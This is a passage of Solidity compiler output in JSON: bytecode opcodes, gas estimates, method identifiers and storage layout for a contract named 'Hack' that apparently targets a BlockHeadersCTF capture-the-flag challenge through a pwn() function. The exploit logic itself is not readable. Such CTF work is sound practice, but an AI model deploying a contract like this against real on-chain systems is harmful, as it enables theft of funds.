0x2DC DUP2 PUSH2 0x2C2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x2F5 PUSH0 DUP4 ADD DUP6 PUSH2 0x2D3 JUMP JUMPDEST PUSH2 0x302 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x207 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP10 MCOPY 0xA9 JUMPDEST 0xC2 0xDE 0x4B PUSH6 0x593D24151A79 SWAP8 JUMP DUP15 0xCF 0xBD 0xB2 PUSH12 0x71A6FB61F324ADC51E8F9B64 PUSH20 0x6F6C634300081B00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "166200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"blockHeadersCTF()": "infinite",
						"feeBps()": "2403",
						"pwn()": "infinite"
					}
				},
				"methodIdentifiers": {
					"blockHeadersCTF()": "7466346d",
					"feeBps()": "24a9d853",
					"pwn()": "dd365b8b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "contracts/BlockHeadersCTF.sol:Hack",
						"label": "blockHeadersCTF",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(BlockHeadersCTF)260"
					},
					{
						"astId": 6,
						"contract": "contracts/BlockHeadersCTF.sol:Hack",
						"label": "hackerAddr",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 10,
						"contract": "contracts/BlockHeadersCTF.sol:Hack",
						"label": "deposits",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 16,
						"contract": "contracts/BlockHeadersCTF.sol:Hack",
						"label": "feeBps",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					},
					{
						"astId": 19,
						"contract": "contracts/BlockHeadersCTF.sol:Hack",
						"label": "donationBps",
						"offset": 0,
						"slot": "4",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(BlockHeadersCTF)260": {
						"encoding": "inplace",
						"label": "contract BlockHeadersCTF",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}